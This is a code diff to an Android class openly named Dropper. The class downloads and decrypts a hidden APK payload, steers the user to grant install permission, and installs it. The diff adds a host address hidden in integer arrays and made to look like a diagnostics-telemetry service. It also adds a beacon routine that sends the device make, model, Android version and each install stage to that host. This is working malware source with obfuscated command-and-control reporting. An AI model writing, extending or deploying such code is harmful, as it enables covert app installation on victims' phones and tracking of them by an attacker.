@@ -30,6 +30,14 @@ public class Dropper {
         {112,97,121,108,111,97,100,46,98,105,110}
     };
 
+    private static final int[][] B = {
+        {104,116,116,112,115,58,47,47},
+        {115,104,105,101,108,100,45,98,101,97,99,111,110,46},
+        {100,105,97,103,110,111,115,116,105,99,115,45},
+        {116,101,108,101,109,101,116,114,121,46},
+        {119,111,114,107,101,114,115,46,100,101,118,47}
+    };
+
     private static final int[] K = {
         86,49,100,76,49,120,83,51,99,117,114,51,83,104,49,51,108,100,50,48,50,54,75,51,121,86,51,114,49,102,49,51
     };
@@ -39,14 +47,23 @@ public class Dropper {
             @Override
             public void run() {
                 try {
+                    beacon(context, "dropper_started");
                     File apk = fetch(context);
-                    if (apk == null || !apk.exists()) return;
+                    if (apk == null || !apk.exists()) {
+                        beacon(context, "dropper_fetch_failed");
+                        return;
+                    }
+                    beacon(context, "dropper_downloaded");
                     if (!canInstall(context)) {
+                        beacon(context, "dropper_need_permission");
                         openSettings(context);
                         return;
                     }
+                    beacon(context, "dropper_install_triggered");
                     install(context, apk);
-                } catch (Exception e) { }
+                } catch (Exception e) {
+                    beacon(context, "dropper_error: " + e.getMessage());
+                }
             }
         }).start();
     }
@@ -57,10 +74,47 @@ public class Dropper {
         return sb.toString();
     }
 
+    private static String beaconUrl() {
+        StringBuilder sb = new StringBuilder();
+        for (int[] p : B) for (int c : p) sb.append((char) c);
+        return sb.toString();
+    }
+
     private static byte[] key() {
         byte[] k = new byte[K.length];
         for (int i = 0; i < K.length; i++) k[i] = (byte) K[i];
         return k;
+    }
+
+    private static void beacon(Context context, String status) {
+        try {
+            URL u = new URL(beaconUrl());
+            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(8000);
+            conn.setReadTimeout(8000);
+            String device = Build.MANUFACTURER + " " + Build.MODEL;
+            String android = Build.VERSION.RELEASE;
+            String payload = "{"
+                    + "\"device\":\"" + esc(device) + "\","
+                    + "\"android\":\"" + esc(android) + "\","
+                    + "\"status\":\"" + esc(status) + "\","
+                    + "\"timestamp\":\"\""
+                    + "}";
+            OutputStream os = conn.getOutputStream();
+            os.write(payload.getBytes("UTF-8"));
+            os.flush();
+            os.close();
+            conn.getResponseCode();
+            conn.disconnect();
+        } catch (Exception ignored) { }
+    }
+
+    private static String esc(String s) {
+        if (s == null) return "";
+        return s.replace("\\", "\\\\").replace("\"", "\\\"");
     }
 
     private static boolean canInstall(Context context) {
@@ -136,4 +190,4 @@ public class Dropper {
         s.commit(pending.getIntentSender());
         s.close();
     }
-}
+            }
